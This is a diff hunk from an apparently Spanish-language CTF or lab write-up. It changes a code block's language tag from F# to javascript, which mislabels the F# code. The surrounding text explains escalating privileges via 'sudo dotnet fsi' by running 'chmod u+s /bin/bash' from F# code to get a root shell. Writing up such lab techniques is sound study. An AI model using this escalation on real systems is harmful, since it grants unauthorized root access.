@@ -231,7 +231,7 @@ $sudo /usr/bin/dotnet fsi
 
 - Y dentro de la consola interactiva podemos escribir el código en lenguaje F# que ejecute el comando `"chmod u+s /bin/bash"` dentro del sistema; al ser root, debería ejecutarse sin problemas y podríamos ejecutar la bash con privilegios:
 
-```F#
+```javascript
 open System.Diagnostics
 
 let psi = new ProcessStartInfo("chmod", "u+s /bin/bash")
